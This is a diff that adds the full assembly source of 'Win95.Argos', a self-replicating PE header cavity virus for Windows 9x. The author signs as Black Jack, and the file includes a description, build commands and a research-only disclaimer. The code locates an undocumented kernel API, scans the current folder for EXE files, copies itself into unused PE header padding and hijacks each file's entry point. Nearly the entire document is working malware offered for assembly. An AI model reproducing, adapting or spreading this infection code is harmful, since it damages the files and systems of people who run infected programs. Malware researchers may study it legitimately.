@@ -1,0 +1,281 @@
+; *************************************************************************
+; ********************                                 ********************
+; ********************           Win95.Argos           ********************
+; ********************                by               ********************
+; ********************            BLACK JACK           ********************
+; ********************                                 ********************
+; *************************************************************************
+
+comment ~
+
+NAME: Win95.Argos
+AUTHOR: Black Jack /LineZer0 /Metaphase
+TYPE: direct acting win95 PE header cavity virus
+SIZE: 328 bytes (but of course infected files won't increase in size)
+
+COMMENTS: This virus is very similar to the Win95.Murkry-II virus published
+          in Xine#3. Not very creative of me, I admit, but I just started
+          out coding for win32, and I just want to try out all the PE
+          infection techniques there are.
+
+DESCRIPTION: When an infected EXE file is executed, the virus gets control
+             first. It then checks if it runs under win9X and exits if not.
+             It then gets the undocumented API VxDCall0 (the very first API
+             exported by kernel32.dll in win9X) and uses it to call int21h.
+             Then it searches for PE EXE files in the current directory
+             (using DOS LFN functions 714Eh/714Fh) and infects them by
+             overwriting the unused zero padding bytes in the PE header.
+
+ASSEMBLE WITH: 
+                tasm32 /mx /m argos.asm
+                tlink32 /Tpe /aa argos.obj,,, import32.lib
+
+DISCLAIMER: I do *NOT* support the spreading of virii in the wild. There-
+            fore, this source was only written for research and education.
+            Please do not spread it. The author and his groups can't be
+            hold responsible for what you decide to do with this source.
+
+~
+; ===== CODE STARTS HERE ==================================================
+
+Extrn ExitProcess:Proc                          ; PEs without imports crash
+
+kernel32    EQU 0BFF70000h                      ; kernel32 address in win9X
+virus_size  EQU (end_virus - start)
+header_size EQU 800h                            ; size of header to read in
+
+.386p
+.model flat
+
+.data
+dummy dd 0
+
+.code
+start:
+        pushad                                  ; save registers
+
+        xor eax, eax
+        mov ah, (((size my_data)/100h)+1)       ; EAX=data size on stack
+        sub esp, eax                            ; reserve place on stack
+        mov ebp, esp                            ; set up stack frame
+
+        push eax                                ; push size my_data
+
+        mov eax, kernel32                       ; EAX=kernel32 base address
+        mov ebx, [eax+3Ch]                      ; get new header RVA
+        add ebx, eax                            ; EAX=new header VA
+        cmp word ptr [ebx], "EP"                ; found kernel32?
+        JE go_on                                ; ok, we're in Win9X
+
+exit:
+        pop eax                                 ; pop size my_data
+        add esp, eax                            ; restore stack
+        popa                                    ; restore registers
+        ret                                     ; return to host
+
+copyright       db "[Argos/Black Jack]"
+
+go_on:
+        mov ebx, [ebx+120]                      ; export table RVA
+        mov ebx, [ebx+eax+1Ch]                  ; Address array of API ofs
+        mov ebx, [ebx+eax]                      ; first API: VxDCall0
+        add ebx, eax                            ; EBX=Offset VxDCall0 API
+        mov [ebp.VxDCall0], ebx                 ; store it (IMPORTANT!)
+
+        mov ax, 714Eh                           ; LFN find first function
+        xor ecx, ecx                            ; attributes
+
+        call next_filespec
+        db "*.EXE", 0                           ; search for *.EXE files
+next_filespec:
+        pop edx                                 ; EDX=offset filespec
+
+        xor ebx, ebx                            ; EBX=0
+
+findfile:
+        lea edi, [ebp.FileAttributes]           ; FindFileData struct offs
+        xor esi, esi                            ; 64bit time/date format
+        call int21h                             ; call our int21h procedure
+        JC exit                                 ; if error, then quit
+        or ebx, ebx                             ; was it FindNextFile call?
+        JNE dont_store_handle                   ; don't store handle again
+        mov [ebp.search_handle], ax             ; store search handle
+dont_store_handle:
+
+        mov ax, 716Ch                           ; open file
+        mov bx, 2                               ; open for read and write
+        xor edx, edx
+        inc edx                                 ; edx=1 (open file)
+        lea esi, [ebp.FileName]                 ; DS:ESI=file name pointer
+        call int21h
+        xchg ebx, eax                           ; file handle to EBX
+
+        mov ah, 3Fh                             ; read DOS EXE header
+        xor ecx, ecx
+        mov cl, 40h                             ; ECX=40h (length to read)
+        lea edx, [ebp.exe_marker]               ; DS:EDX=pointer to buffer
+        call int21h
+
+        call move_FP                            ; move filepointer to new
+                                                ; header and prepare read
+
+        mov ah, 3Fh                             ; read PE header
+        call int21h
+
+        cmp word ptr [ebp.pe_marker], "EP"      ; is it a PE file?
+        JNE close                               ; if not, then close again
+
+        movzx eax, [ebp.NumberOfSections]       ; EAX=NumberOfSections
+        xor ecx, ecx
+        mov cl, 40                              ; ECX=40h (sect. hdr size)
+        mul ecx                                 ; size of section headers
+        add ax, 24                              ; add size of file_header
+        add ax, [ebp.SizeOfOptHeader]           ; add size of optional hdr
+                                                ; EAX=actual size of PE hdr
+        lea edi, [eax+ebp.pe_marker]            ; EDI=end of used PE header
+
+        mov cx, virus_size                      ; ECX=virus size
+        add eax, [ebp.new_header]               ; EAX=RVA of virus place
+        mov edx, eax                            ; save EAX to EDX
+        add eax, ecx                            ; EAX=RVA end virus code
+        cmp eax, [ebp.SizeOfHeaders]            ; virus too big for cave?
+        JA close                                ; if yes, then close
+
+        db 0BEh                                 ; mov esi, imm32
+start_offset    dd offset start                 ; start of virus code
+
+        cld                                     ; clear direction flag
+        rep movsb                               ; move virus code after hdr
+
+        mov ecx, [ebp.ImageBase]                ; ECX=ImageBase
+        add edx, ecx                            ; EDX=VA virus entry point
+
+        mov dword ptr [edi-(end_virus-start_offset)], edx   ; save it
+
+; The PE header contains the fields SizeOfCode, SizeOfDATA and SizeOfBSS.
+; These are directly after each other and they are unused. Thats why I use
+; them to store some instructions there and make them the Entrypoint. These
+; instructions are:
+;                       push host entry point VA
+;                       push virus entry point VA
+;                       ret (jump to the virus, that is)
+;
+; And after the virus is done, it just does a simple ret to return to the
+; host (that's why also the first generation virus doesn't crash).
+
+        mov al, 68h                             ; opcode: push imm32
+        lea edi, [ebp.SizeOfCode]               ; save place to store code
+        cmp byte ptr [edi], al                  ; already infected?
+        JE close                                ; if yes, then close file
+        stosb                                   ; otherwise store the push
+        mov eax, [ebp.EntryPoint]               ; EAX=RVA Entry Point
+        add eax, ecx                            ; EAX=VA entry point
+        stosd                                   ; store it
+        mov al, 68h                             ; opcode: push imm32
+        stosb                                   ; store it
+        xchg edx, eax                           ; EAX=VA of virus place
+        stosd                                   ; store it
+        mov al, 0C3h                            ; opcode: ret
+        stosb                                   ; store it
+
+        mov eax, [ebp.new_header]               ; EAX=RVA PE header
+        add ax, SizeOfCode-pe_marker            ; EAX=RVA new entry point
+        mov [ebp.EntryPoint],eax                ; store it
+
+        call move_FP                            ; move filepointer to new
+                                                ; header and prepare write
+
+        mov ah, 40h                             ; write modified header
+        call int21h
+
+close:
+        mov ah, 3Eh                             ; close file function
+        call int21h
+        
+findnext:
+        mov ax, 714Fh                           ; LFN find next file
+        mov bx, [ebp.search_handle]             ; search handle
+        JMP findfile
+
+move_FP:                                        ; moves filepointer to new
+                                                ; header and prepare r/w
+
+        mov ax, 4200h                           ; mov file pointer
+                                                ; (relative to file start)
+        mov cx, word ptr [ebp.new_header+2]     ; where to move
+        mov dx, word ptr [ebp.new_header]
+        call int21h
+
+        mov ecx, header_size                    ; size to read/write
+        lea edx, [ebp.pe_marker]                ; offset to read/write
+
+        ret
+
+
+int21h:                                         ; call protected mode int21
+        push ecx                                ; push parameters
+        push eax
+        push 2A0010h
+        call [ebp.VxDCall0]                     ; call VxDCall0 API
+        ret
+
+end_virus:                                      ; end of virus code
+
+
+my_data struc                                   ; variables stored on stack
+
+VxDCall0         dd ?
+search_handle    dw ?
+file_handle      dd ?
+bytes_read       dd ?
+
+exe_marker       dw ?                           ; DOS header structure
+dosheader_shit   db 58 dup(?)
+new_header       dd ?
+
+
+union                                           ; PE header structure
+db header_size dup(?)
+struc
+pe_marker        dd ?
+machine          dw ?
+NumberOfSections dw ?
+TimeDateStamp    dd ?
+DebugShit        dd ?, ?
+SizeOfOptHeader  dw ?
+flags            dw ?
+
+optional_header  dw ?
+linkerversion    dw ?
+SizeOfCode       dd ?
+SizeOfDATA       dd ?
+SizeOfBSS        dd ?
+EntryPoint       dd ?
+BaseOfCode       dd ?
+BaseOfData       dd ?
+ImageBase        dd ?
+SectionAlign     dd ?
+FileAlign        dd ?
+OSVersion        dd ?
+OurVersion       dd ?
+SubVersion       dd ?
+reserved1        dd ?
+SizeOfImage      dd ?
+SizeOfHeaders    dd ?
+Checksum         dd ?
+ends
+ends
+
+
+FileAttributes   dd ?                           ; FindFileData struct
+CreationTime     dq ?
+LastAccessTime   dq ?
+LastWriteTime    dq ?
+FileSize         dq ?
+wfd_reserved     dq ?
+FileName         db 260 dup(?)
+DosFileName      db 14 dup(?)
+
+ends
+
+end start
